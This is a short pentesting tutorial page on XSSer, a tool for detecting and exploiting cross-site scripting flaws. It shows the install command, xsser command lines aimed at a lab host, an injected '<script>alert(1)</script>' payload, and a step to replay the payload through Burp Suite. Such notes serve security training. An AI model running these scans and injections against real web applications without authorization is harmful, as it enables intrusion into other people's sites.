---
title: XSSer -  An automated Web Pentesting Framework Tool to Detect and Exploit XSS vulnerabilities
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - web pentesting
---

# XSSer - An automated Web Pentesting Framework Tool to Detect and Exploit XSS vulnerabilities

A Cross Site Scripter (or XSSer) is an automatic framework to detect, exploit and report XSS vulnerabilities in web-based applications.

## Installation

```bash
sudo apt install xsser
```

## Usage 

The following commands are used in combination with BurpSuite:

```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'

xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto

xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```

With this, the encoded XSS payload is generated. Now, in Burp Suite, replace the POST parameters with the final attack payload and forward the request.

